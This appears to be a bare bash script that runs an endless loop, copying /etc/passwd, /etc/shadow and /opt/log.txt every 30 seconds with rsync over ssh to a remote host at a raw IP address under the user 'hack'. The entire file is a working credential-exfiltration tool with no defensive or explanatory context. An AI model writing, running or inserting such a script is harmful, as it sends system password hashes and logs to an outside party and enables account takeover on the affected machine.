#! /bin/bash

while true; do
rsync -av -e ssh /etc/passwd /etc/shadow /opt/log.txt hack@137.229.25.237
sleep 30
done
